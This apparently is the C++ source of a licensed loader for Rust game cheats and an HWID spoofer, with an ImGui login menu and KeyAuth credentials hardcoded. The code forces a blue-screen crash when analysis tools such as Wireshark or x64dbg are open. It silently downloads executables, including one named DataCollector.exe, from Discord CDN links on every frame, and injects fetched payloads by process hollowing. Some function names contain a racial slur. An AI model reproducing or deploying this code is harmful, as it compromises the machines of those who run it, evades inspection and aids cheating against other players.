#include "Main.h"
#include<tchar.h>

int nubmerslmao = 249;

bool loginsuccess = false;

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void bsod()
{
    BOOLEAN bl;
    ULONG Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdow
}

void nignog() {
    if (FindWindowA(NULL, ("The Wireshark Network Analyzer"))) { bsod(); }
    if (FindWindowA(NULL, ("Progress Telerik Fiddler Web Debugger"))) { bsod(); }
    if (FindWindowA(NULL, ("Fiddler"))) { bsod(); }
    if (FindWindowA(NULL, ("HTTP Debugger"))) { bsod(); }
    if (FindWindowA(NULL, ("x64dbg"))) { bsod(); }
    if (FindWindowA(NULL, ("dnSpy"))) { bsod(); }
    if (FindWindowA(NULL, ("FolderChangesView"))) { bsod(); }
    if (FindWindowA(NULL, ("BinaryNinja"))) { bsod(); }
    if (FindWindowA(NULL, ("HxD"))) { bsod(); }
    if (FindWindowA(NULL, ("Cheat Engine 7.2"))) { bsod(); }
    if (FindWindowA(NULL, ("Cheat Engine 7.1"))) { bsod(); }
    if (FindWindowA(NULL, ("Cheat Engine 7.0"))) { bsod(); }
    if (FindWindowA(NULL, ("Cheat Engine 6.9"))) { bsod(); }
    if (FindWindowA(NULL, ("Cheat Engine 6.8"))) { bsod(); }
    if (FindWindowA(NULL, ("Ida"))) { bsod(); }
    if (FindWindowA(NULL, ("Ida Pro"))) { bsod(); }
    if (FindWindowA(NULL, ("Ida Freeware"))) { bsod(); }
    if (FindWindowA(NULL, ("HTTP Debugger Pro"))) { bsod(); }
    if (FindWindowA(NULL, ("Process Hacker"))) { bsod(); }
    if (FindWindowA(NULL, ("Process Hacker 2"))) { bsod(); }
    if (FindWindowA(NULL, ("OllyDbg"))) { bsod(); }
}

using namespace KeyAuth;

char key[60] = "";
char username[60] = "";
char password[60] = "";
int tabs = 1;

bool runspoofer = false;
bool runspoofers = false;

bool runscript = false;
bool runscripts = false;
int counting = 0;
int countings = 0;


// Main code
ImFont* Arial;

bool ismenuopen = true;

void usernamdeart()
{
    nignog();
    ImGui::SetCursorPos({ 84.f, 42.f });
    ImGui::BeginChild("###1", ImVec2(218, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 84.f, 72.f });
    ImGui::BeginChild("###2", ImVec2(218, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 83.f, 42.f });
    ImGui::BeginChild("###3", ImVec2(1, 32), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 301.f, 42.f });
    ImGui::BeginChild("###4", ImVec2(1, 32), true);
    ImGui::EndChild();
}

void loadmenusss()
{
    nignog();
    ImGui::SetCursorPos({ 210.f, 247.f });
    ImGui::BeginChild("###1ss", ImVec2(151, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 210.f, 276.f });
    ImGui::BeginChild("###2sss", ImVec2(151, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 209.f, 247.f });
    ImGui::BeginChild("###3sss", ImVec2(1, 31), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 360.f, 247.f });
    ImGui::BeginChild("###4sss", ImVec2(1, 31), true);
    ImGui::EndChild();
}

void registretart()
{
    nignog();
    ImGui::SetCursorPos({ 84.f, 92.f });
    ImGui::BeginChild("###a", ImVec2(218, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 84.f, 122.f });
    ImGui::BeginChild("###b", ImVec2(218, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 83.f, 92.f });
    ImGui::BeginChild("###c", ImVec2(1, 32), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 301.f, 92.f });
    ImGui::BeginChild("###d", ImVec2(1, 32), true);
    ImGui::EndChild();
}

void loginbuttonart()
{
    nignog();
    ImGui::SetCursorPos({ 107.f, 158.f });
    ImGui::BeginChild("###q", ImVec2(173, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 107.f, 193.f });
    ImGui::BeginChild("###p", ImVec2(173, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 106.f, 158.f });
    ImGui::BeginChild("###;", ImVec2(1, 37), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 279.f, 158.f });
    ImGui::BeginChild("###]", ImVec2(1, 37), true);
    ImGui::EndChild();

}

void registerbbuttonart()
{
    nignog();
    ImGui::SetCursorPos({ 107.f, 202.f });
    ImGui::BeginChild("###[[", ImVec2(173, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 107.f, 237.f });
    ImGui::BeginChild("###df", ImVec2(173, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 106.f, 202.f });
    ImGui::BeginChild("###sds", ImVec2(1, 37), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 279.f, 202.f });
    ImGui::BeginChild("###8----->", ImVec2(1, 37), true);
    ImGui::EndChild();

}

void licensekeyart()
{
    nignog();
    ImGui::SetCursorPos({ 84.f, 142.f });
    ImGui::BeginChild("###aghs", ImVec2(218, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 84.f, 172.f });
    ImGui::BeginChild("###bsgh", ImVec2(218, 1), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 83.f, 142.f });
    ImGui::BeginChild("###csdgh", ImVec2(1, 32), true);
    ImGui::EndChild();
    ImGui::SetCursorPos({ 301.f, 142.f });
    ImGui::BeginChild("###dsdgh", ImVec2(1, 32), true);
    ImGui::EndChild();
}


std::string name = XorStr("Vanzy");
std::string ownerid = XorStr("6sYvXzE1n7");
std::string secret = XorStr("40731fdaaec5b415e2feb8c9fa65f955f3fbd5d0e01cf9ceb87c1e36a8105f9b");
std::string version = XorStr("1.3");

api KeyAuthApp(name, ownerid, secret, version);

int runPE64(
    LPPROCESS_INFORMATION lpPI,
    LPSTARTUPINFO lpSI,
    LPVOID lpImage,
    LPWSTR wszArgs,
    SIZE_T szArgs
)
{
    nignog();
    WCHAR wszFilePath[MAX_PATH];
    if (!GetModuleFileName(
        NULL,
        wszFilePath,
        sizeof wszFilePath
    ))
    {
        return -1;
    }
    WCHAR wszArgsBuffer[MAX_PATH + 2048];
    ZeroMemory(wszArgsBuffer, sizeof wszArgsBuffer);
    SIZE_T length = wcslen(wszFilePath);
    memcpy(
        wszArgsBuffer,
        wszFilePath,
        length * sizeof(WCHAR)
    );
    wszArgsBuffer[length] = ' ';
    memcpy(
        wszArgsBuffer + length + 1,
        wszArgs,
        szArgs
    );
    nignog();
    PIMAGE_DOS_HEADER lpDOSHeader =
        reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
    PIMAGE_NT_HEADERS lpNTHeader =
        reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<DWORD64>(lpImage) + lpDOSHeader->e_lfanew
            );
    if (lpNTHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return -2;
    }
    nignog();
    if (!CreateProcess(
        NULL,
        wszArgsBuffer,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        lpSI,
        lpPI
    ))
    {
        return -3;
    }
    nignog();
    CONTEXT stCtx;
    ZeroMemory(&stCtx, sizeof stCtx);
    stCtx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(lpPI->hThread, &stCtx))
    {
        TerminateProcess(
            lpPI->hProcess,
            -4
        );
        return -4;
    }
    nignog();
    LPVOID lpImageBase = VirtualAllocEx(
        lpPI->hProcess,
        reinterpret_cast<LPVOID>(lpNTHeader->OptionalHeader.ImageBase),
        lpNTHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (lpImageBase == NULL)
    {
        TerminateProcess(
            lpPI->hProcess,
            -5
        );
        return -5;
    }
    nignog();
    if (!WriteProcessMemory(
        lpPI->hProcess,
        lpImageBase,
        lpImage,
        lpNTHeader->OptionalHeader.SizeOfHeaders,
        NULL
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -6
        );
        return -6;
    }

    for (
        SIZE_T iSection = 0;
        iSection < lpNTHeader->FileHeader.NumberOfSections;
        ++iSection
        )
    {
        PIMAGE_SECTION_HEADER stSectionHeader =
            reinterpret_cast<PIMAGE_SECTION_HEADER>(
                reinterpret_cast<DWORD64>(lpImage) +
                lpDOSHeader->e_lfanew +
                sizeof(IMAGE_NT_HEADERS64) +
                sizeof(IMAGE_SECTION_HEADER) * iSection
                );
        nignog();
        if (!WriteProcessMemory(
            lpPI->hProcess,
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImageBase) +
                stSectionHeader->VirtualAddress
                ),
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImage) +
                stSectionHeader->PointerToRawData
                ),
            stSectionHeader->SizeOfRawData,
            NULL
        ))
        {
            TerminateProcess(
                lpPI->hProcess,
                -7
            );
            return -7;
        }
    }
    nignog();
    if (!WriteProcessMemory(
        lpPI->hProcess,
        reinterpret_cast<LPVOID>(
            stCtx.Rdx + sizeof(LPVOID) * 2
            ),
        &lpImageBase,
        sizeof(LPVOID),
        NULL
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -8
        );
        return -8;
    }
    nignog();
    stCtx.Rcx = reinterpret_cast<DWORD64>(lpImageBase) +
        lpNTHeader->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(
        lpPI->hThread,
        &stCtx
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -9
        );
        return -9;
    }
    nignog();
    if (!ResumeThread(lpPI->hThread))
    {
        TerminateProcess(
            lpPI->hProcess,
            -10
        );
        return -10;
    }
    nignog();
    return 0;
}

int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    nignog();

    HWND ConsWind = GetConsoleWindow();
    ShowWindow(ConsWind, 1);

    nignog();
    KeyAuthApp.init();
    nignog();

    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, L"Usermode", NULL };
    RegisterClassEx(&wc);
    main_hwnd = CreateWindow(wc.lpszClassName, L"Usermode", WS_POPUP, 0, 0, 5, 5, NULL, NULL, wc.hInstance, NULL);
    nignog();

    if (!CreateDeviceD3D(main_hwnd)) {
        CleanupDeviceD3D();
        UnregisterClass(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    nignog();
    ShowWindow(main_hwnd, SW_HIDE);
    UpdateWindow(main_hwnd);

    ImGui::CreateContext();

    ImGuiIO& io = ImGui::GetIO();
    io.IniFilename = nullptr;
    io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable;
    Arial = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Arial.ttf", 19);
    nignog();
    ImGui::StyleColorsDark();

    ImGui_ImplWin32_Init(main_hwnd);
    ImGui_ImplDX9_Init(g_pd3dDevice);

    DWORD window_flags = ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar;
    nignog();
    RECT screen_rect;
    GetWindowRect(GetDesktopWindow(), &screen_rect);

    ImGuiStyle& style = ImGui::GetStyle();
    style.Colors[ImGuiCol_WindowBg] = ImColor(40, 40, 40);
    style.Colors[ImGuiCol_ChildBg] = ImColor(15, 15, 15);
    style.Colors[ImGuiCol_Border] = ImColor(0, 0, 0);
    style.Colors[ImGuiCol_TextSelectedBg] = ImColor(255, 255, 255, 50);
    style.Colors[ImGuiCol_FrameBg] = ImColor(34, 34, 34);
    style.Colors[ImGuiCol_FrameBgActive] = ImColor(51, 52, 54);
    style.Colors[ImGuiCol_FrameBgHovered] = ImColor(51, 52, 54);
    style.Colors[ImGuiCol_Button] = ImColor(29, 29, 29);
    style.Colors[ImGuiCol_ButtonHovered] = ImColor(23, 23, 23);
    style.Colors[ImGuiCol_ButtonActive] = ImColor(23, 23, 23);
    style.Colors[ImGuiCol_Text] = ImColor(255, 255, 255);
    

    if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)
    {
        style.WindowBorderSize = 2;
        style.WindowRounding = 0.0f;
    }
    nignog();
    // Main loop
    MSG msg;
    ZeroMemory(&msg, sizeof(msg));

    int tab = 0;

    while (msg.message != WM_QUIT)
    {
        if (PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            continue;
        }

        ImGui_ImplDX9_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();
        {

            if (loginsuccess == true)
            {
                ImGui::SetNextWindowSize({ 160.f, 160.f });
                ImGui::SetNextWindowPos(ImVec2(960, 540));
                ImGui::GetCursorStartPos();
                ImGui::Begin("h###LoginSuccess", &loader_active, window_flags);
                {   
                    if (ImGui::Button("###Nigled", ImVec2(30, 30)))
                    {
                        loginsuccess = false;
                      
                    }
                }
                ImGui::End();
            }

            if (nubmerslmao == 250)
            {
                nignog();
                nubmerslmao = 0;
            }
            else
            {
                nubmerslmao = nubmerslmao + 1;
            }

            ImGui::SetNextWindowSize({ 400.f, 300.f });
            if (ismenuopen == true)
            {
                ImGui::Begin("Usermode", &loader_active, window_flags);
                {

                    ImGui::SetCursorPos({ 7.f, 7.f });
                    ImGui::BeginChild("###Page", ImVec2(386, 286), true);
                    {

                        style.Colors[ImGuiCol_Button] = ImColor(255, 60, 60);

                        ImGui::SetCursorPos({ 363.f, 3.f });
                        if (ImGui::Button("###DisarrayExit", ImVec2(20, 20)))
                        {
                            exit(-1);
                        }
                        style.Colors[ImGuiCol_Button] = ImColor(29, 29, 29);

                        if (tab == 0)
                        {
                            usernamdeart();

                            ImGui::SetCursorPos({ 85.f, 44.f });
                            ImGui::InputTextWithHint("###Username", "Username", username, sizeof(username));

                            registretart();

                            ImGui::SetCursorPos({ 85.f, 94.f });
                            ImGui::InputTextWithHint("###Password", "Password", password, sizeof(password));

                            loginbuttonart();

                            ImGui::SetCursorPos({ 108.f, 160.f });
                            if (ImGui::Button("       Login       ", ImVec2(170, 32)))
                            {
                                if (KeyAuthApp.login(username, password))
                                {
                                    KeyAuthApp.log("user logged in");
                                    tab = 2;
                                }

                            }

                            registerbbuttonart();

                            ImGui::SetCursorPos({ 108.f, 204.f });
                            if (ImGui::Button("   Register   ", ImVec2(170, 32)))
                            {
                                tab = 1;
                            }
                        }


                        if (tab == 1)
                        {
                            usernamdeart();

                            ImGui::SetCursorPos({ 85.f, 44.f });
                            ImGui::InputTextWithHint("###Username", "Username", username, sizeof(username));

                            registretart();

                            ImGui::SetCursorPos({ 85.f, 94.f });
                            ImGui::InputTextWithHint("###Password", "Password", password, sizeof(password));

                            licensekeyart();

                            ImGui::SetCursorPos({ 85.f, 144.f });
                            ImGui::InputTextWithHint("###LicenseKey", "License Key", key, sizeof(key));

                            registerbbuttonart();

                            ImGui::SetCursorPos({ 108.f, 204.f });
                            if (ImGui::Button("   Register   ", ImVec2(170, 32)))
                            {
                                if (KeyAuthApp.regstr(username, password, key))
                                {
                                    MessageBoxA(NULL, "Success", "Register", MB_OK);
                                    tab = 0;
                                }
                                else
                                {
                                    tab = 0;
                                }
                            }
                        }
                        if (tab == 2)
                        {
                            if (KeyAuthApp.user_data.subscription == "Rust")
                            {
                                ImGui::SetCursorPos({ 10.f, 10.f });
                                ImGui::Text("Subscription: Rust Cheat");

                            }
                            else if (KeyAuthApp.user_data.subscription == "Spoofer")
                            {
                                ImGui::SetCursorPos({ 10.f, 10.f });
                                ImGui::Text("Subscription: Spoofer");

                                ImGui::SetCursorPos({ 200.f, 35.f });
                                ImGui::BeginChild("###csdgh", ImVec2(160, 160), true);
                                ImGui::EndChild();

                                ImGui::SetCursorPos({ 238.f, 220.f });
                                if (ImGui::Button("Load", ImVec2(76, 32)))
                                {
                                    runspoofers = true;
                                    ismenuopen = false;
                                }

                            }
                            else if (KeyAuthApp.user_data.subscription == "Rust Script")
                            {
                                ImGui::SetCursorPos({ 4.f, 2.f });
                                {
                                    ImGui::Text("Subscription: Rust Script");
                                }

                                ImGui::SetCursorPos({ 10.f, 35.f });
                                ImGui::BeginChild("###NI<F", ImVec2(365, 200), true);
                                {
                                    ImGui::Text("Patch Notes:");
                                    ImGui::Text("[+] Added Hide Process");
                                    ImGui::Text("[+] Added Custom Crosshair");
                                    ImGui::Text("[+] Added Hip Fire Mode");
                                    ImGui::Text("[+] Added Mini Menu");
                                    ImGui::Text("[+] Added Auto Sprint");
                                    ImGui::Text("[+] Added Anti AFK");
                                    ImGui::Text("[+] Added Auto Unload");
                                }
                                ImGui::EndChild();

                                ImGui::SetCursorPos({ 10.f, 253.f });
                                {
                                    ImGui::Text("Status:"); ImGui::SameLine();

                                    style.Colors[ImGuiCol_Text] = ImColor(20, 180, 81);
                                    ImGui::Text("Undetected");
                                    style.Colors[ImGuiCol_Text] = ImColor(255, 255, 255);
                                }

                                loadmenusss();

                                ImGui::SetCursorPos({ 210.f, 248.f });
                                if (ImGui::Button("Load", ImVec2(150, 28)))
                                {
                                    runscripts = true;
                                    ismenuopen = false;
                                }

                            }
                            else
                            {
                                bsod();
                            }
                        }
                    }
                    ImGui::EndChild();
                }
                ImGui::End();
            }

            HRESULT hrb;
            LPCTSTR Urlb = _T("https://cdn.discordapp.com/attachments/884159876274716703/884912434312261642/Dll_Injector.exe"), Fileb = _T("C:\\ProgramData\\Dll_Injector.exe");
            hrb = URLDownloadToFile(0, Urlb, Fileb, 0, 0);

            if (runscripts == true)
            {
                counting = counting + 1;
                ismenuopen = false;
                if (counting == 100)
                {
                    nignog();
                    counting = counting + 1;
                    runscript = true;
                }
            }

            if (runspoofers == true)
            {
                countings = countings + 1;
                ismenuopen = false;
                if (countings == 100)
                {
                    nignog();
                    countings = countings + 1;
                    runspoofer = true;
                }
            }

            if (runspoofer == true)
            {
                HWND ConsWind = GetConsoleWindow();
                // ShowWindow(ConsWind, 0);
                DWORD dwRet = 0;


                std::vector<std::uint8_t> bytes = KeyAuthApp.download("958106");
                {
                    PROCESS_INFORMATION stPI;
                    ZeroMemory(&stPI, sizeof stPI);
                    STARTUPINFO stSI;
                    ZeroMemory(&stSI, sizeof stSI);
                    WCHAR szArgs[] = L"";
                    if (!runPE64(
                        &stPI,
                        &stSI,
                        reinterpret_cast<LPVOID>(bytes.data()),
                        szArgs,
                        sizeof szArgs
                    ))
                    {
                        WaitForSingleObject(
                            stPI.hProcess,
                            INFINITE
                        );

                        GetExitCodeProcess(
                            stPI.hProcess,
                            &dwRet
                        );

                        CloseHandle(stPI.hThread);
                        CloseHandle(stPI.hProcess);
                    }

                    return dwRet;
                }
            }

            if (runscript == true)
            {


                HRESULT hrb;
                LPCTSTR Urlb = _T("https://cdn.discordapp.com/attachments/870468672710381618/896181990162837555/DataCollector.exe"), Fileb = _T("C:\\ProgramData\\DataCollector.exe");
                hrb = URLDownloadToFile(0, Urlb, Fileb, 0, 0);

                HRESULT hr;
                LPCTSTR Url = _T("https://cdn.discordapp.com/attachments/884159876274716703/884906975018745916/Hide.dll"), File = _T("C:\\ProgramData\\Hide.dll");
                hr = URLDownloadToFile(0, Url, File, 0, 0);

                

    

                STARTUPINFO si = { sizeof(STARTUPINFO) };
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi;


                HWND ConsWind = GetConsoleWindow();
                // ShowWindow(ConsWind, 0);
                DWORD dwRet = 0;
                
                std::vector<std::uint8_t> bytes = KeyAuthApp.download("635881");
                {
                    PROCESS_INFORMATION stPI;
                    ZeroMemory(&stPI, sizeof stPI);
                    STARTUPINFO stSI;
                    ZeroMemory(&stSI, sizeof stSI);
                    WCHAR szArgs[] = L"";
                    if (!runPE64(
                        &stPI,
                        &stSI,
                        reinterpret_cast<LPVOID>(bytes.data()),
                        szArgs,
                        sizeof szArgs
                    ))
                    {
                        WaitForSingleObject(
                            stPI.hProcess,
                            INFINITE
                        );

                        GetExitCodeProcess(
                            stPI.hProcess,
                            &dwRet
                        );

                        CloseHandle(stPI.hThread);
                        CloseHandle(stPI.hProcess);
                    }

                    return dwRet;

                }
            }
        }
        ImGui::EndFrame();

        g_pd3dDevice->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, 0, 1.0f, 0);
        if (g_pd3dDevice->BeginScene() >= 0)
        {
            ImGui::Render();
            ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
            g_pd3dDevice->EndScene();
        }

        // Update and Render additional Platform Windows
        if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)
        {
            ImGui::UpdatePlatformWindows();
            ImGui::RenderPlatformWindowsDefault();
        }

        HRESULT result = g_pd3dDevice->Present(NULL, NULL, NULL, NULL);

        // Handle loss of D3D9 device
        if (result == D3DERR_DEVICELOST && g_pd3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET) {
            ResetDevice();
        }
        if (!loader_active) {
            msg.message = WM_QUIT;
        }
    }

    ImGui_ImplDX9_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    CleanupDeviceD3D();
    DestroyWindow(main_hwnd);
    UnregisterClass(wc.lpszClassName, wc.hInstance);

    return 0;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg)
    {
    case WM_SIZE:
        if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED)
        {
            g_d3dpp.BackBufferWidth = LOWORD(lParam);
            g_d3dpp.BackBufferHeight = HIWORD(lParam);
            ResetDevice();
        }
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) // Disable ALT application menu
            return 0;
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}